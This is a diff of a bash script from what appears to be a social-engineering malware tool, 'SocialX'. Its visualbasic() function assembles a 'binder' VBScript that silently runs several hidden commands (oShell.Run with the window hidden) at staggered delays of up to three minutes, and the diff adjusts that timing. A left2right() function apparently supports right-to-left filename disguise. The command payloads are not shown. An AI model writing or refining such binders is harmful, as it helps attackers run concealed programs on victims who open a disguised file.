@@ -232,11 +232,12 @@ function visualbasic() {
     binder_vbs_code11='oShell.Run strArgs, 0, false'
     binder_vbs_code12='WScript.Sleep(2000)'
     binder_vbs_code13='oShell.Run strArgs3, 0, false'
-    binder_vbs_code14='oShell.Run strArgs1, 0, false'
-    binder_vbs_code15='WScript.Sleep(15000)'
-    binder_vbs_code16='oShell.Run strArgs2, 0, false'
-    binder_vbs_code17='WScript.Sleep(180000)'
-    binder_vbs_code18='oShell.Run strArgs4, 0, false'
+    binder_vbs_code14='WScript.Sleep(2000)'
+    binder_vbs_code15='oShell.Run strArgs1, 0, false'
+    binder_vbs_code16='WScript.Sleep(20000)'
+    binder_vbs_code17='oShell.Run strArgs2, 0, false'
+    binder_vbs_code18='WScript.Sleep(180000)'
+    binder_vbs_code19='oShell.Run strArgs4, 0, false'
     
     ########################################################################################################################
     echo $binder_vbs_code > SOCIALX_VBS/socialx.vbs
@@ -254,10 +255,11 @@ function visualbasic() {
     echo $binder_vbs_code12 >> SOCIALX_VBS/socialx.vbs
     echo $binder_vbs_code13 >> SOCIALX_VBS/socialx.vbs
     echo $binder_vbs_code14 >> SOCIALX_VBS/socialx.vbs
-	echo $binder_vbs_code15 >> SOCIALX_VBS/socialx.vbs
-	echo $binder_vbs_code16 >> SOCIALX_VBS/socialx.vbs
-	echo $binder_vbs_code17 >> SOCIALX_VBS/socialx.vbs
-	echo $binder_vbs_code18 >> SOCIALX_VBS/socialx.vbs
+    echo $binder_vbs_code15 >> SOCIALX_VBS/socialx.vbs
+    echo $binder_vbs_code16 >> SOCIALX_VBS/socialx.vbs
+    echo $binder_vbs_code17 >> SOCIALX_VBS/socialx.vbs
+    echo $binder_vbs_code18 >> SOCIALX_VBS/socialx.vbs
+    echo $binder_vbs_code19 >> SOCIALX_VBS/socialx.vbs
 }
 function left2right() {
     echo "${green}[+]${lightblue}Chromium Will Be Opened.Please Click To ${RED}COPY ${lightblue} Button."
